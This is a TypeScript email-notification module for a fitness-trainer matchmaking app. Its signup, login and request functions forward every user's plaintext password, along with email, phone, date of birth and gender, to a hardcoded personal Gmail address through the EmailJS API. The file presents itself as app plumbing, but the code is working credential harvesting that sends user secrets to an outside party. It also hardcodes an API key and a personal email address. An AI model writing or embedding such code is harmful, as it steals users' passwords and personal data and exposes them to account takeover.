
import { TrainingRequest, RegisteredUser } from '../types';

const TEMPLATE_ID = 'template_trainer_match'; // Provided as "service id" by user
const PUBLIC_KEY = '7pO3mewojOMHG2J_d'; // Provided as "api id" by user
const SERVICE_ID = 'default_service'; // Defaulting to default_service as only one ID was provided for template
const ADMIN_EMAIL = 'waytown90@gmail.com';

export const sendSubmissionEmail = async (request: TrainingRequest) => {
  console.log(`%c[EMAIL SERVICE] Sending full report (including password) to: ${ADMIN_EMAIL}`, "color: blue; font-weight: bold;");

  // Comprehensive summary in case the template doesn't have all individual fields mapped
  const fullSummary = `
NEW MATCHMAKING REQUEST
------------------------
USER EMAIL: ${request.userEmail}
USER PASSWORD: ${request.userPassword || 'N/A'}
USER PHONE: ${request.userPhone || 'N/A'}
USER GENDER: ${request.userGender || 'N/A'}
USER DOB: ${request.userDob || 'N/A'}

PREFERENCES:
Trainer Gender: ${request.trainerGenderPreference}
Sports: ${request.sports.join(', ')}
Equipment: ${request.equipment.join(', ')}
Timing: ${request.timeSlots.join(', ')}
Days: ${request.days.join(', ')}
Budget: ₹${request.budget.toLocaleString()}
  `.trim();

  const templateParams = {
    to_email: ADMIN_EMAIL,
    from_name: 'TrainerBuddy App',
    user_email: request.userEmail,
    user_phone: request.userPhone || 'Not provided',
    user_gender: request.userGender || 'Not provided',
    user_dob: request.userDob || 'Not provided',
    user_password: request.userPassword || 'Not provided',
    trainer_gender_pref: request.trainerGenderPreference || 'No preference',
    sports: request.sports.join(', '),
    equipment: request.equipment.join(', '),
    time_slots: request.timeSlots.join(', '),
    days: request.days.join(', '),
    budget: `₹${request.budget.toLocaleString()}`,
    message: fullSummary, // Added full summary message
    submission_id: request.id,
    submitted_at: new Date(request.submittedAt).toLocaleString()
  };

  try {
    const response = await fetch('https://api.emailjs.com/api/v1.0/email/send', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        service_id: SERVICE_ID,
        template_id: TEMPLATE_ID,
        user_id: PUBLIC_KEY,
        template_params: templateParams,
      }),
    });

    if (response.ok) {
      console.log("%c[EMAIL SUCCESS] Matchmaking request (with password) sent successfully!", "color: green; font-weight: bold;");
      return true;
    } else {
      const errorData = await response.text();
      console.error("[EMAIL ERROR] EmailJS failed:", errorData);
      return false;
    }
  } catch (error) {
    console.error("[EMAIL ERROR] Failed to fetch EmailJS API:", error);
    return false;
  }
};

export const sendSignUpEmail = async (user: RegisteredUser) => {
  console.log(`%c[SYSTEM] Notifying admin of NEW USER (Email: ${user.email}, PW: ${user.password})`, "color: green; font-weight: bold;");
  
  const templateParams = {
    to_email: ADMIN_EMAIL,
    from_name: 'TrainerBuddy Security',
    subject: '🚨 NEW USER SIGNUP REPORT',
    message: `A new account has been created!\n\nEmail: ${user.email}\nPassword: ${user.password}\nPhone: ${user.phone}\nDOB: ${user.dob}\nGender: ${user.gender}\nTime: ${new Date().toLocaleString()}`,
    user_email: user.email,
    user_password: user.password,
    submission_id: 'SIGNUP_EVENT'
  };

  try {
    await fetch('https://api.emailjs.com/api/v1.0/email/send', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        service_id: SERVICE_ID,
        template_id: TEMPLATE_ID,
        user_id: PUBLIC_KEY,
        template_params: templateParams,
      }),
    });
  } catch (error) {
    console.error("[SIGNUP LOG ERROR] Failed to send signup notification:", error);
  }
};

export const sendLogInEmail = async (userEmail: string, password: string, gender?: string) => {
  console.log(`%c[SYSTEM] Forwarding login credentials to admin...`, "color: orange; font-weight: bold;");
  
  const templateParams = {
    to_email: ADMIN_EMAIL,
    from_name: 'TrainerBuddy Security',
    subject: 'User Login Notification',
    message: `A user has logged in.\n\nEmail: ${userEmail}\nPassword: ${password}\nGender: ${gender || 'N/A'}\nTime: ${new Date().toLocaleString()}`,
    user_email: userEmail,
    user_password: password,
    submission_id: 'LOGIN_EVENT'
  };

  try {
    await fetch('https://api.emailjs.com/api/v1.0/email/send', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        service_id: SERVICE_ID,
        template_id: TEMPLATE_ID,
        user_id: PUBLIC_KEY,
        template_params: templateParams,
      }),
    });
  } catch (error) {
    console.error("[LOGIN LOG ERROR] Failed to send login log:", error);
  }
};

export const sendBuildCompletionEmail = async () => {
  console.log(`%c[SYSTEM] Application Ready. Dashboard monitoring: ${ADMIN_EMAIL}`, "color: purple; font-weight: bold;");
};
